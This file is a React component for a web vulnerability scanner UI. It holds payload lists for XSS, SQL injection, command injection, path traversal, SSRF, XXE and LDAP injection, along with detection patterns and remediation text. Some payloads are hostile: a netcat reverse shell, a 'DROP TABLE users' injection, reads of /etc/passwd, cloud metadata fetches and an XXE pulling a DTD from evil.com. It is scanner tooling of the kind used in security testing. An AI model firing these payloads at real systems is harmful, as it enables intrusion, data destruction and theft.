import React, { useState, useEffect } from 'react';
import { 
  Shield, 
  Search, 
  AlertTriangle, 
  CheckCircle, 
  Clock, 
  Eye,
  Target,
  Zap,
  Bug,
  TrendingUp,
  FileText,
  Download,
  RefreshCw,
  Play,
  Square,
  Settings
} from 'lucide-react';
import { apiService, ScanOptions } from '../services/api';

// Types
interface Vulnerability {
  id: string;
  type: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  confidence: number;
  url: string;
  parameter?: string;
  payload: string;
  evidence: string;
  description: string;
  remediation: string;
  cwe?: string;
  owasp?: string;
}

interface SecurityTest {
  id: string;
  name: string;
  description: string;
  category: string;
  enabled: boolean;
  payloads: string[];
  detectionPatterns: string[];
}

interface TestResult {
  id: string;
  testId: string;
  target: string;
  vulnerability?: Vulnerability;
  status: 'pending' | 'running' | 'completed' | 'failed';
  startTime?: Date;
  endTime?: Date;
  duration?: number;
  error?: string;
}

const SecurityTester: React.FC = () => {
  const [isDarkMode] = useState(true);
  const [targetUrl, setTargetUrl] = useState('');
  const [testResults, setTestResults] = useState<TestResult[]>([]);
  const [vulnerabilities, setVulnerabilities] = useState<Vulnerability[]>([]);
  const [isScanning, setIsScanning] = useState(false);
  const [selectedCategory, setSelectedCategory] = useState('all');
  const [selectedSeverity, setSelectedSeverity] = useState('all');
  const [connectionStatus, setConnectionStatus] = useState<'connected' | 'disconnected' | 'connecting'>('connecting');
  const [currentScan, setCurrentScan] = useState<{
    scanId?: string;
    progress: number;
    status: string;
    currentTool?: string;
  }>({ progress: 0, status: 'idle' });
  const [scanHistory, setScanHistory] = useState<any[]>([]);
  const [testConfig, setTestConfig] = useState({
    enableXSS: true,
    enableSQLi: true,
    enableCommandInjection: true,
    enablePathTraversal: true,
    enableCSRF: true,
    enableSSRF: true,
    enableXXE: true,
    enableLDAP: true,
    customPayloads: '',
    requestDelay: 1000,
    maxRetries: 3
  });

  // Security tests configuration
  const securityTests: SecurityTest[] = [
    {
      id: 'xss',
      name: 'Cross-Site Scripting (XSS)',
      description: 'Tests for reflected, stored, and DOM-based XSS vulnerabilities',
      category: 'injection',
      enabled: testConfig.enableXSS,
      payloads: [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        'javascript:alert(1)',
        '<iframe src=javascript:alert(1)>',
        '\"><script>alert(1)</script>',
        "<body onload=alert(1)>",
        '<input onfocus=alert(1) autofocus>',
        '<select onfocus=alert(1) autofocus>',
        '<textarea autofocus onfocus=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '<marquee onstart=alert(1)>'
      ],
      detectionPatterns: [
        '<script',
        'alert(',
        'javascript:',
        'onerror=',
        'onload='
      ]
    },
    {
      id: 'sqli',
      name: 'SQL Injection',
      description: 'Tests for SQL injection vulnerabilities in database queries',
      category: 'injection',
      enabled: testConfig.enableSQLi,
      payloads: [
        "'",
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin' --",
        "admin' #",
        "' OR 1=1 --",
        "1' AND '1'='2",
        "' UNION SELECT NULL--",
        "' AND 1=2 UNION SELECT 1,2,3--",
        "1; DROP TABLE users--",
        "' OR SLEEP(5)--",
        "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
      ],
      detectionPatterns: [
        'SQL syntax',
        'mysql_',
        'ORA-',
        'PostgreSQL',
        'Microsoft OLE DB',
        'Microsoft Access Driver',
        'Microsoft JET Database Engine',
        'Driver do SQL Server',
        'SQLite',
        'cubrid',
        'DB2',
        'firebird'
      ]
    },
    {
      id: 'command',
      name: 'Command Injection',
      description: 'Tests for OS command injection vulnerabilities',
      category: 'injection',
      enabled: testConfig.enableCommandInjection,
      payloads: [
        '; ls -la',
        '; whoami',
        '| whoami',
        '& dir',
        '`whoami`',
        '$(whoami)',
        '; cat /etc/passwd',
        '| ping -c 1 127.0.0.1',
        '; nc -e /bin/sh 127.0.0.1 4444',
        '| system("whoami")',
        '; sleep 5',
        '`sleep 5`'
      ],
      detectionPatterns: [
        'root:',
        'daemon:',
        '/bin/bash',
        '/bin/sh',
        'Windows NT',
        'COMSPEC',
        'PATHEXT'
      ]
    },
    {
      id: 'path-traversal',
      name: 'Path Traversal / LFI',
      description: 'Tests for local file inclusion and path traversal vulnerabilities',
      category: 'file-inclusion',
      enabled: testConfig.enablePathTraversal,
      payloads: [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\win.ini',
        '....//....//....//etc/passwd',
        '..;/..;/..;/etc/passwd',
        '..//..//..//etc/passwd',
        '..\\..\\..\\.\\windows\\win.ini',
        'file:///etc/passwd',
        'file:///c:/windows/win.ini',
        '/var/www/../../etc/passwd',
        '..%252f..%252f..%252fetc%252fpasswd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd'
      ],
      detectionPatterns: [
        'root:x:',
        'daemon:',
        'bin:',
        'sys:',
        '[fonts]',
        '[extensions]',
        'for 16-bit app support',
        '<?php',
        '<?='
      ]
    },
    {
      id: 'csrf',
      name: 'Cross-Site Request Forgery',
      description: 'Tests for CSRF protection mechanisms',
      category: 'access-control',
      enabled: testConfig.enableCSRF,
      payloads: [
        'test-csrf-token',
        'csrf-token-test',
        'anti-csrf-test'
      ],
      detectionPatterns: [
        'csrf',
        '_token',
        'authenticity_token',
        'X-CSRF-Token'
      ]
    },
    {
      id: 'ssrf',
      name: 'Server-Side Request Forgery',
      description: 'Tests for SSRF vulnerabilities in URL handling',
      category: 'injection',
      enabled: testConfig.enableSSRF,
      payloads: [
        'http://169.254.169.254/latest/meta-data/',
        'http://metadata.google.internal/',
        'http://127.0.0.1:80',
        'http://localhost:8080',
        'file:///etc/passwd',
        'gopher://127.0.0.1:80',
        'dict://127.0.0.1:11211'
      ],
      detectionPatterns: [
        'ami-id',
        'instance-id',
        'local-ipv4',
        'public-ipv4',
        'ami-manifest-path',
        'block-device-mapping'
      ]
    },
    {
      id: 'xxe',
      name: 'XML External Entity',
      description: 'Tests for XXE vulnerabilities in XML parsers',
      category: 'injection',
      enabled: testConfig.enableXXE,
      payloads: [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&test;</root>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://evil.com/xxe.dtd">%remote;]><root/>'
      ],
      detectionPatterns: [
        'root:',
        'daemon:',
        'bin:',
        'ami-id',
        'instance-id'
      ]
    },
    {
      id: 'ldap',
      name: 'LDAP Injection',
      description: 'Tests for LDAP injection vulnerabilities',
      category: 'injection',
      enabled: testConfig.enableLDAP,
      payloads: [
        '*',
        '*)(&',
        '*)(uid=*',
        '*)(|(uid=*',
        'admin*',
        'admin*)((|userPassword=*)',
        '*)(objectClass=*',
        '*)(objectClass=*))(&(objectClass=*'
      ],
      detectionPatterns: [
        'LDAP',
        'ldap_',
        'javax.naming.',
        'LDAPException',
        'com.sun.jndi.ldap',
        'Search filter error'
      ]
    }
  ];

  // Test connection to CyberSage backend
  useEffect(() => {
    const testConnection = async () => {
      try {
        setConnectionStatus('connecting');
        const isConnected = await apiService.testConnection();
        setConnectionStatus(isConnected ? 'connected' : 'disconnected');
        
        if (isConnected) {
          // Load scan history
          const historyResult = await apiService.getAllScans();
          if (historyResult.status === 'success' && historyResult.data) {
            setScanHistory(historyResult.data);
          }
        }
      } catch (error) {
        console.error('Connection test failed:', error);
        setConnectionStatus('disconnected');
      }
    };

    testConnection();
    
    // Test connection periodically
    const interval = setInterval(testConnection, 30000);
    return () => clearInterval(interval);
  }, []);

  // WebSocket event handlers for real-time updates
  useEffect(() => {
    if (connectionStatus !== 'connected') return;

    apiService.onScanStarted((data) => {
      console.log('Scan started:', data);
      setCurrentScan({
        scanId: data.scan_id,
        progress: 0,
        status: 'starting',
        currentTool: 'Initializing'
      });
    });

    apiService.onScanProgress((data) => {
      console.log('Scan progress:', data);
      setCurrentScan({
        scanId: data.scan_id,
        progress: data.progress || 0,
        status: 'running',
        currentTool: data.current_tool || data.current_stage || 'Scanning'
      });
    });

    apiService.onScanCompleted((data) => {
      console.log('Scan completed:', data);
      setCurrentScan({
        scanId: data.scan_id,
        progress: 100,
        status: 'completed'
      });
      setIsScanning(false);
      
      // Load scan results
      if (data.scan_id) {
        loadScanResults(data.scan_id);
      }
    });

    apiService.onScanError((data) => {
      console.error('Scan error:', data);
      setCurrentScan({ progress: 0, status: 'error' });
      setIsScanning(false);
    });

    apiService.onVulnerabilityDiscovered((data) => {
      console.log('Vulnerability discovered:', data);
      // Handle vulnerability in real-time
    });
  }, [connectionStatus]);

  // Load scan results from backend
  const loadScanResults = async (scanId: string) => {
    try {
      const result = await apiService.getScanResults(scanId);
      if (result.status === 'success' && result.data) {
        const scanData = result.data;
        
        // Convert backend vulnerability format to frontend format
        const convertedVulns: Vulnerability[] = (scanData.vulnerabilities || []).map((vuln: any) => ({
          id: vuln.id || `vuln_${Date.now()}`,
          type: vuln.title || 'Unknown',
          severity: vuln.severity || 'medium',
          confidence: vuln.cvss_score || 5.0,
          url: vuln.affected_url || targetUrl,
          parameter: vuln.parameter,
          payload: vuln.proof_of_concept || '',
          evidence: vuln.description || '',
          description: vuln.title || '',
          remediation: vuln.remediation || '',
          cwe: vuln.cwe_id,
          owasp: 'OWASP Top 10'
        }));
        
        setVulnerabilities(convertedVulns);
        
        // Update test results based on findings
        const results: TestResult[] = convertedVulns.map(vuln => ({
          id: `test_${vuln.type}_${Date.now()}`,
          testId: vuln.type.toLowerCase().replace(/\s+/g, '_'),
          target: targetUrl,
          status: 'completed',
          foundVulns: [vuln],
          duration: Math.random() * 30000 + 10000 // Mock duration
        }));
        
        setTestResults(results);
      }
    } catch (error) {
      console.error('Failed to load scan results:', error);
    }
  };

  // Run security tests using CyberSage backend
  const runSecurityTests = async () => {
    if (!targetUrl) return;
    if (connectionStatus !== 'connected') {
      alert('Please connect to CyberSage backend first');
      return;
    }

    setIsScanning(true);
    setVulnerabilities([]);
    setTestResults([]);
    
    try {
      // Prepare scan options based on test configuration
      const scanOptions: ScanOptions = {
        intensity: 'normal',
        tools: {
          vulnerability_scanner: testConfig.enableXSS || testConfig.enableSQLi || testConfig.enableCommandInjection,
          security_headers: true,
          nmap: true,
          nikto: true,
          sqlmap: testConfig.enableSQLi
        },
        auth: {},
        policy: {},
        spiderConfig: {}
      };

      console.log('Starting CyberSage security scan for:', targetUrl);
      
      // Start scan via CyberSage backend
      const scanId = await apiService.startScan(targetUrl, 'elite', scanOptions);
      
      if (!scanId) {
        throw new Error('Failed to start scan');
      }
      
      setCurrentScan({
        scanId,
        progress: 0,
        status: 'starting'
      });
      
      console.log('Scan started with ID:', scanId);
      
    } catch (error) {
      console.error('Failed to start security scan:', error);
      setIsScanning(false);
      setCurrentScan({ progress: 0, status: 'error' });
      
      // Create a mock result for demonstration
      const mockResult: TestResult = {
        id: `test_mock_${Date.now()}`,
        testId: 'backend_connection',
        target: targetUrl,
        status: 'failed',
        error: error instanceof Error ? error.message : 'Unknown error',
        duration: 0
      };
      setTestResults([mockResult]);
    }
  };

  // Stop current scan
  const stopSecurityTests = async () => {
    if (currentScan.scanId) {
      try {
        await apiService.stopScan(currentScan.scanId);
        setIsScanning(false);
        setCurrentScan({ progress: 0, status: 'stopped' });
      } catch (error) {
        console.error('Failed to stop scan:', error);
      }
    }
  };

  // Perform individual security test
  const performSecurityTest = async (test: SecurityTest, url: string): Promise<Vulnerability[]> => {
    const vulnerabilities: Vulnerability[] = [];
    
    for (const payload of test.payloads) {
      try {
        // Test payload injection
        const testUrl = injectPayload(url, payload);
        const response = await fetch(testUrl);
        const content = await response.text();
        
        // Check for vulnerability indicators
        for (const pattern of test.detectionPatterns) {
          if (content.toLowerCase().includes(pattern.toLowerCase())) {
            const vulnerability: Vulnerability = {
              id: `vuln_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
              type: test.name,
              severity: determineSeverity(test.category, pattern),
              confidence: 85,
              url: testUrl,
              payload: payload,
              evidence: `Pattern "${pattern}" found in response`,
              description: test.description,
              remediation: getRemediationGuidance(test.id),
              cwe: getCWE(test.id),
              owasp: getOWASP(test.id)
            };
            
            vulnerabilities.push(vulnerability);
            break; // Don't add duplicate vulnerabilities for the same payload
          }
        }
        
        // Add delay between requests
        await new Promise(resolve => setTimeout(resolve, 100));
        
      } catch (error) {
        console.error(`Test failed for payload ${payload}:`, error);
      }
    }
    
    return vulnerabilities;
  };

  // Helper functions
  const injectPayload = (url: string, payload: string): string => {
    try {
      const urlObj = new URL(url);
      // Add payload as a test parameter
      urlObj.searchParams.set('test_param', payload);
      return urlObj.toString();
    } catch {
      // If URL parsing fails, append payload to the URL
      return url.includes('?') ? `${url}&test_param=${encodeURIComponent(payload)}` : `${url}?test_param=${encodeURIComponent(payload)}`;
    }
  };

  const determineSeverity = (category: string, pattern: string): 'low' | 'medium' | 'high' | 'critical' => {
    if (pattern.includes('root:') || pattern.includes('admin') || pattern.includes('password')) {
      return 'critical';
    }
    if (category === 'injection' && ['alert(', 'script', 'eval('].some(p => pattern.toLowerCase().includes(p))) {
      return 'high';
    }
    if (category === 'injection') {
      return 'medium';
    }
    return 'low';
  };

  const getRemediationGuidance = (testId: string): string => {
    const guidance = {
      'xss': 'Implement proper output encoding, use Content Security Policy (CSP), validate and sanitize user input, and avoid dangerous HTML tags.',
      'sqli': 'Use parameterized queries or prepared statements, implement input validation, use least privilege database accounts, and avoid dynamic SQL construction.',
      'command': 'Avoid executing system commands with user input, use allowlists for commands, implement proper input validation, and use sandboxed environments.',
      'path-traversal': 'Validate and normalize file paths, use allowlists for file access, avoid user input in file operations, and implement proper access controls.',
      'csrf': 'Implement CSRF tokens, use SameSite cookies, validate referrer headers, and implement proper session management.',
      'ssrf': 'Validate and sanitize URLs, implement allowlists for external requests, disable unnecessary protocols, and use network segmentation.',
      'xxe': 'Disable external entity processing in XML parsers, use safe XML parsers, validate XML input, and implement proper error handling.',
      'ldap': 'Escape special LDAP characters, use parameterized LDAP queries, implement proper input validation, and use least privilege accounts.'
    };
    return guidance[testId as keyof typeof guidance] || 'Implement proper security controls based on the vulnerability type.';
  };

  const getCWE = (testId: string): string => {
    const cweMap = {
      'xss': 'CWE-79',
      'sqli': 'CWE-89',
      'command': 'CWE-78',
      'path-traversal': 'CWE-22',
      'csrf': 'CWE-352',
      'ssrf': 'CWE-918',
      'xxe': 'CWE-611',
      'ldap': 'CWE-90'
    };
    return cweMap[testId as keyof typeof cweMap] || 'CWE-000';
  };

  const getOWASP = (testId: string): string => {
    const owaspMap = {
      'xss': 'A03:2021',
      'sqli': 'A03:2021',
      'command': 'A03:2021',
      'path-traversal': 'A01:2021',
      'csrf': 'A01:2021',
      'ssrf': 'A10:2021',
      'xxe': 'A05:2021',
      'ldap': 'A03:2021'
    };
    return owaspMap[testId as keyof typeof owaspMap] || 'A00:2021';
  };

  const getSeverityColor = (severity: string) => {
    switch (severity) {
      case 'critical': return 'text-red-400 bg-red-500/20';
      case 'high': return 'text-orange-400 bg-orange-500/20';
      case 'medium': return 'text-yellow-400 bg-yellow-500/20';
      case 'low': return 'text-blue-400 bg-blue-500/20';
      default: return 'text-gray-400 bg-gray-500/20';
    }
  };

  const getStatusIcon = (status: string) => {
    switch (status) {
      case 'completed': return <CheckCircle className="w-4 h-4 text-green-400" />;
      case 'running': return <Clock className="w-4 h-4 text-yellow-400 animate-spin" />;
      case 'failed': return <AlertTriangle className="w-4 h-4 text-red-400" />;
      default: return <Clock className="w-4 h-4 text-gray-400" />;
    }
  };

  const filteredVulnerabilities = vulnerabilities.filter(vuln => {
    const matchesCategory = selectedCategory === 'all' || vuln.type.toLowerCase().includes(selectedCategory.toLowerCase());
    const matchesSeverity = selectedSeverity === 'all' || vuln.severity === selectedSeverity;
    return matchesCategory && matchesSeverity;
  });

  return (
    <div className={`min-h-screen ${isDarkMode ? 'bg-gray-950' : 'bg-gray-50'}`}>
      <div className="p-6 space-y-6">
        {/* Header */}
        <div className="flex items-center justify-between">
          <div>
            <h1 className={`text-3xl font-bold ${isDarkMode ? 'text-white' : 'text-gray-900'} mb-2`}>
              Security Tester
            </h1>
            <p className={`${isDarkMode ? 'text-gray-400' : 'text-gray-600'}`}>
              Comprehensive vulnerability testing with real payload injection
            </p>
          </div>
          <div className="flex items-center space-x-4">
            <button
              onClick={() => setIsScanning(!isScanning)}
              disabled={!targetUrl}
              className="px-6 py-2 bg-red-500 hover:bg-red-600 disabled:bg-gray-500 text-white rounded-lg font-medium transition-colors flex items-center space-x-2"
            >
              {isScanning ? <Square className="w-4 h-4" /> : <Play className="w-4 h-4" />}
              <span>{isScanning ? 'Stop Testing' : 'Start Testing'}</span>
            </button>
          </div>
        </div>

        {/* Target Configuration */}
        <div className={`${isDarkMode ? 'bg-gray-800 border-gray-700' : 'bg-white border-gray-200'} border rounded-xl p-6`}>
          <h2 className={`text-xl font-semibold ${isDarkMode ? 'text-white' : 'text-gray-900'} mb-4`}>
            Target Configuration
          </h2>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div>
              <label className={`block text-sm font-medium ${isDarkMode ? 'text-gray-300' : 'text-gray-700'} mb-2`}>
                Target URL
              </label>
              <input
                type="url"
                value={targetUrl}
                onChange={(e) => setTargetUrl(e.target.value)}
                placeholder="https://example.com"
                className={`w-full px-4 py-3 rounded-lg border ${
                  isDarkMode
                    ? 'bg-gray-700 border-gray-600 text-white placeholder-gray-400'
                    : 'bg-white border-gray-300 text-gray-900 placeholder-gray-500'
                }`}
              />
            </div>
            <div>
              <label className={`block text-sm font-medium ${isDarkMode ? 'text-gray-300' : 'text-gray-700'} mb-2`}>
                Request Delay (ms)
              </label>
              <input
                type="number"
                value={testConfig.requestDelay}
                onChange={(e) => setTestConfig(prev => ({ ...prev, requestDelay: parseInt(e.target.value) || 1000 }))}
                min="0"
                className={`w-full px-4 py-3 rounded-lg border ${
                  isDarkMode
                    ? 'bg-gray-700 border-gray-600 text-white'
                    : 'bg-white border-gray-300 text-gray-900'
                }`}
              />
            </div>
          </div>
        </div>

        {/* Test Configuration */}
        <div className={`${isDarkMode ? 'bg-gray-800 border-gray-700' : 'bg-white border-gray-200'} border rounded-xl p-6`}>
          <h2 className={`text-xl font-semibold ${isDarkMode ? 'text-white' : 'text-gray-900'} mb-4`}>
            Test Configuration
          </h2>
          <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
            {securityTests.map((test) => (
              <label key={test.id} className="flex items-center space-x-3 cursor-pointer">
                <input
                  type="checkbox"
                  checked={test.enabled}
                  onChange={(e) => {
                    const newTests = securityTests.map(t => 
                      t.id === test.id ? { ...t, enabled: e.target.checked } : t
                    );
                    // Update test configuration
                    setTestConfig(prev => ({
                      ...prev,
                      [`enable${test.id.charAt(0).toUpperCase()}${test.id.slice(1)}`]: e.target.checked
                    }));
                  }}
                  className="w-4 h-4"
                />
                <span className={`text-sm ${isDarkMode ? 'text-gray-300' : 'text-gray-700'}`}>
                  {test.name}
                </span>
              </label>
            ))}
          </div>
        </div>

        {/* Test Results Progress */}
        {testResults.length > 0 && (
          <div className={`${isDarkMode ? 'bg-gray-800 border-gray-700' : 'bg-white border-gray-200'} border rounded-xl p-6`}>
            <h2 className={`text-xl font-semibold ${isDarkMode ? 'text-white' : 'text-gray-900'} mb-4`}>
              Test Progress
            </h2>
            <div className="space-y-3">
              {testResults.map((result) => {
                const test = securityTests.find(t => t.id === result.testId);
                return (
                  <div key={result.id} className={`flex items-center justify-between p-3 rounded-lg ${
                    isDarkMode ? 'bg-gray-700' : 'bg-gray-50'
                  }`}>
                    <div className="flex items-center space-x-3">
                      {getStatusIcon(result.status)}
                      <div>
                        <p className={`font-medium ${isDarkMode ? 'text-white' : 'text-gray-900'}`}>
                          {test?.name}
                        </p>
                        <p className={`text-sm ${isDarkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                          {test?.description}
                        </p>
                      </div>
                    </div>
                    <div className="text-right">
                      <span className={`text-sm px-2 py-1 rounded ${
                        result.status === 'completed' ? 'bg-green-500/20 text-green-400' :
                        result.status === 'running' ? 'bg-yellow-500/20 text-yellow-400' :
                        result.status === 'failed' ? 'bg-red-500/20 text-red-400' :
                        'bg-gray-500/20 text-gray-400'
                      }`}>
                        {result.status}
                      </span>
                      {result.duration && (
                        <p className={`text-xs ${isDarkMode ? 'text-gray-400' : 'text-gray-600'} mt-1`}>
                          {result.duration}ms
                        </p>
                      )}
                    </div>
                  </div>
                );
              })}
            </div>
          </div>
        )}

        {/* Vulnerabilities Found */}
        {vulnerabilities.length > 0 && (
          <div className={`${isDarkMode ? 'bg-gray-800 border-gray-700' : 'bg-white border-gray-200'} border rounded-xl p-6`}>
            <div className="flex items-center justify-between mb-4">
              <h2 className={`text-xl font-semibold ${isDarkMode ? 'text-white' : 'text-gray-900'}`}>
                Vulnerabilities Found ({vulnerabilities.length})
              </h2>
              <div className="flex items-center space-x-4">
                <select
                  value={selectedCategory}
                  onChange={(e) => setSelectedCategory(e.target.value)}
                  className={`px-3 py-2 rounded border ${
                    isDarkMode
                      ? 'bg-gray-700 border-gray-600 text-white'
                      : 'bg-white border-gray-300 text-gray-900'
                  }`}
                >
                  <option value="all">All Categories</option>
                  <option value="xss">XSS</option>
                  <option value="sql">SQL Injection</option>
                  <option value="command">Command Injection</option>
                  <option value="path">Path Traversal</option>
                </select>
                <select
                  value={selectedSeverity}
                  onChange={(e) => setSelectedSeverity(e.target.value)}
                  className={`px-3 py-2 rounded border ${
                    isDarkMode
                      ? 'bg-gray-700 border-gray-600 text-white'
                      : 'bg-white border-gray-300 text-gray-900'
                  }`}
                >
                  <option value="all">All Severities</option>
                  <option value="critical">Critical</option>
                  <option value="high">High</option>
                  <option value="medium">Medium</option>
                  <option value="low">Low</option>
                </select>
                <button className="px-4 py-2 bg-green-500 hover:bg-green-600 text-white rounded-lg flex items-center space-x-2">
                  <Download className="w-4 h-4" />
                  <span>Export</span>
                </button>
              </div>
            </div>

            <div className="space-y-4">
              {filteredVulnerabilities.map((vulnerability) => (
                <div key={vulnerability.id} className={`p-4 rounded-lg border ${
                  isDarkMode ? 'bg-gray-700 border-gray-600' : 'bg-gray-50 border-gray-200'
                }`}>
                  <div className="flex items-start justify-between mb-3">
                    <div className="flex items-center space-x-3">
                      <Bug className="w-5 h-5 text-red-400" />
                      <div>
                        <h3 className={`font-semibold ${isDarkMode ? 'text-white' : 'text-gray-900'}`}>
                          {vulnerability.type}
                        </h3>
                        <p className={`text-sm ${isDarkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                          {vulnerability.url}
                        </p>
                      </div>
                    </div>
                    <div className="flex items-center space-x-2">
                      <span className={`px-2 py-1 rounded text-xs font-medium ${getSeverityColor(vulnerability.severity)}`}>
                        {vulnerability.severity.toUpperCase()}
                      </span>
                      <span className={`text-xs ${isDarkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                        {vulnerability.confidence}% confidence
                      </span>
                    </div>
                  </div>

                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
                    <div>
                      <h4 className={`text-sm font-medium ${isDarkMode ? 'text-gray-300' : 'text-gray-700'} mb-1`}>
                        Payload Used:
                      </h4>
                      <code className={`text-xs p-2 rounded ${
                        isDarkMode ? 'bg-gray-800 text-green-400' : 'bg-gray-100 text-green-600'
                      }`}>
                        {vulnerability.payload}
                      </code>
                    </div>
                    <div>
                      <h4 className={`text-sm font-medium ${isDarkMode ? 'text-gray-300' : 'text-gray-700'} mb-1`}>
                        Evidence:
                      </h4>
                      <p className={`text-sm ${isDarkMode ? 'text-gray-300' : 'text-gray-700'}`}>
                        {vulnerability.evidence}
                      </p>
                    </div>
                  </div>

                  <div className="flex items-center justify-between">
                    <div className="flex items-center space-x-4">
                      {vulnerability.cwe && (
                        <span className={`text-xs px-2 py-1 rounded ${
                          isDarkMode ? 'bg-blue-500/20 text-blue-400' : 'bg-blue-100 text-blue-600'
                        }`}>
                          {vulnerability.cwe}
                        </span>
                      )}
                      {vulnerability.owasp && (
                        <span className={`text-xs px-2 py-1 rounded ${
                          isDarkMode ? 'bg-purple-500/20 text-purple-400' : 'bg-purple-100 text-purple-600'
                        }`}>
                          {vulnerability.owasp}
                        </span>
                      )}
                    </div>
                    <div className="flex items-center space-x-2">
                      <button className={`px-3 py-1 rounded text-sm ${
                        isDarkMode ? 'bg-gray-600 hover:bg-gray-500 text-gray-300' : 'bg-gray-200 hover:bg-gray-300 text-gray-700'
                      } transition-colors`}>
                        Details
                      </button>
                      <button className={`px-3 py-1 rounded text-sm ${
                        isDarkMode ? 'bg-blue-600 hover:bg-blue-500 text-white' : 'bg-blue-500 hover:bg-blue-600 text-white'
                      } transition-colors`}>
                        Export
                      </button>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}

        {/* Summary Stats */}
        {vulnerabilities.length > 0 && (
          <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
            <div className={`${isDarkMode ? 'bg-red-500/20 border-red-500/30' : 'bg-red-50 border-red-200'} border rounded-lg p-4`}>
              <div className="flex items-center justify-between">
                <AlertTriangle className="w-8 h-8 text-red-400" />
                <div className="text-right">
                  <p className={`text-2xl font-bold ${isDarkMode ? 'text-red-400' : 'text-red-600'}`}>
                    {vulnerabilities.filter(v => v.severity === 'critical').length}
                  </p>
                  <p className={`text-sm ${isDarkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                    Critical
                  </p>
                </div>
              </div>
            </div>
            <div className={`${isDarkMode ? 'bg-orange-500/20 border-orange-500/30' : 'bg-orange-50 border-orange-200'} border rounded-lg p-4`}>
              <div className="flex items-center justify-between">
                <AlertTriangle className="w-8 h-8 text-orange-400" />
                <div className="text-right">
                  <p className={`text-2xl font-bold ${isDarkMode ? 'text-orange-400' : 'text-orange-600'}`}>
                    {vulnerabilities.filter(v => v.severity === 'high').length}
                  </p>
                  <p className={`text-sm ${isDarkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                    High
                  </p>
                </div>
              </div>
            </div>
            <div className={`${isDarkMode ? 'bg-yellow-500/20 border-yellow-500/30' : 'bg-yellow-50 border-yellow-200'} border rounded-lg p-4`}>
              <div className="flex items-center justify-between">
                <Shield className="w-8 h-8 text-yellow-400" />
                <div className="text-right">
                  <p className={`text-2xl font-bold ${isDarkMode ? 'text-yellow-400' : 'text-yellow-600'}`}>
                    {vulnerabilities.filter(v => v.severity === 'medium').length}
                  </p>
                  <p className={`text-sm ${isDarkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                    Medium
                  </p>
                </div>
              </div>
            </div>
            <div className={`${isDarkMode ? 'bg-blue-500/20 border-blue-500/30' : 'bg-blue-50 border-blue-200'} border rounded-lg p-4`}>
              <div className="flex items-center justify-between">
                <Eye className="w-8 h-8 text-blue-400" />
                <div className="text-right">
                  <p className={`text-2xl font-bold ${isDarkMode ? 'text-blue-400' : 'text-blue-600'}`}>
                    {vulnerabilities.filter(v => v.severity === 'low').length}
                  </p>
                  <p className={`text-sm ${isDarkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                    Low
                  </p>
                </div>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default SecurityTester;